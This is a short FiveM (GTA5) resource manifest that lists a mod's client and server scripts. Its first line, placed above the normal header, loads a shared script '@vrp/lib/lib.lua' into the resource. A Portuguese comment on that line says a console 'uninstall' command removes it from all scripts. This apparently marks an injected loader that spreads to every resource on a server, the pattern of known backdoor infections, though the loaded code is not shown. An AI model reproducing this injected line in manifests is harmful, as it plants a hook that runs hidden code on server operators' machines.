shared_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"


fx_version 'bodacious'
games { 'gta5' }

author 'Kiminaze'

client_scripts {
	'@vrp/lib/utils.lua',
	'@NativeUI/NativeUI.lua',
	'config.lua',
	'client.lua'
}

server_scripts {
	'@vrp/lib/utils.lua',
	'server.lua',
} 
              